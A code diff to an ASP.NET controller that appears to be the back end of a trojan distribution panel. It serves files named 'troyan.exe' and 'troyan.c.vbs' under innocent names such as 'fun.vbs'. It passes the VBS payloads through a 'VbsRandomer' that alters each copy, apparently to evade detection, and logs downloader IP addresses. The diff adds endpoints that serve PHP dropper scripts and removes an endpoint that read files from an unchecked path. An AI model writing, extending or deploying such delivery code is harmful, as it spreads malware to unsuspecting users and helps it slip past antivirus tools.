@@ -1,21 +1,12 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Data;
-using System.IO;
-using System.Linq;
-using System.Net;
-using System.Net.Sockets;
+﻿using System.Data;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
-using System.Text.RegularExpressions;
 using cp.Code;
-using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.Data.SqlClient;
 using Microsoft.Extensions.Caching.Memory;
-using Microsoft.VisualBasic.CompilerServices;
 using model;
 
 namespace cp.Controllers;
@@ -225,7 +216,7 @@ public class CpController : Controller
         return GetFile(_serverService.GetExe(server), "troyan.exe");
     }
     
-    protected async Task<IActionResult> GetFileFromString(string server, string file, string name, string random, string target)
+    protected async Task<IActionResult> GetFileAdvanced(string server, string file, string name, string random, string target, string randomMethod, string nofile)
     {
         try
         {
@@ -237,9 +228,12 @@ public class CpController : Controller
                     .SetSlidingExpiration(TimeSpan.FromMinutes(1));
                 _memoryCache.Set(file, fileContent, cacheEntryOptions);
             }
-            string modifiedContent = VbsRandomer.Modify(fileContent);
-            var fileBytes = Encoding.UTF8.GetBytes(modifiedContent);
+            if (randomMethod == "vbs")
+                fileContent = VbsRandomer.Modify(fileContent);
+            var fileBytes = Encoding.UTF8.GetBytes(fileContent);
             Response.Headers.Add("Content-Type", "text/plain");
+            if (nofile == "nofile")
+                return Ok(fileContent);
             return File(fileBytes, "text/plain", name.Split(".")[0] + "_" + System.Environment.TickCount.ToString() + "." + name.Split(".")[1] );
         }
         catch (Exception)
@@ -259,7 +253,14 @@ public class CpController : Controller
         
         await DnLog(server, profile, ipAddress);
         
-        return await GetFileFromString(server, "troyan.c.vbs", "fun.vbs", random, target);
+        return await GetFileAdvanced(server, "troyan.c.vbs", "fun.vbs", random, target, "vbs", "");
+    }
+    
+        
+    [HttpGet("{server}/{profile}/GetVbsPhp")]
+    public async Task<IActionResult> GetVbsPhp(string server, string profile)
+    {
+        return await GetFileAdvanced(server, "dn.php", "dn.php", "", "", "","nofile");
     }
     
     [HttpGet("{server}/{profile}/{random}/{target}/GetLightVbs")]
@@ -273,7 +274,13 @@ public class CpController : Controller
 
         await DnLog(server, profile, ipAddress);
         
-        return await GetFileFromString(server, "litetroyan.c.vbs", "litefun.vbs", random, target);
+        return await GetFileAdvanced(server, "litetroyan.c.vbs", "litefun.vbs", random, target, "vbs", "");
+    }
+    
+    [HttpGet("{server}/{profile}/GetLightVbsPhp")]
+    public async Task<IActionResult> GetLiteVbsPhp(string server, string profile)
+    {
+        return await GetFileAdvanced(server, "dn_light.php", "dn_light.php", "", "", "", "nofile");
     }
 
     protected async Task DnLog(string server, string profile, string ipAddress)
@@ -292,20 +299,6 @@ public class CpController : Controller
 
                 await command.ExecuteNonQueryAsync();
             }
-        }
-    }
-
-    [HttpGet("Readme")]
-    public IActionResult Readme([FromQuery] string chapter)
-    {
-        try
-        {
-            var content = System.IO.File.ReadAllText($"Readme\\{chapter}.txt");
-            return Ok(content);
-        }
-        catch (Exception e)
-        {
-            return Ok("Not found:" + chapter);
         }
     }
     
@@ -425,6 +418,7 @@ public class CpController : Controller
 
             
             existingModel.Bux = updatedModel.Bux;
+            existingModel.DnSponsor = updatedModel.DnSponsor;
             existingModel.DisableVirus = updatedModel.DisableVirus;
             
             if (!ContainsUniqueValues(existingModel.Domains))
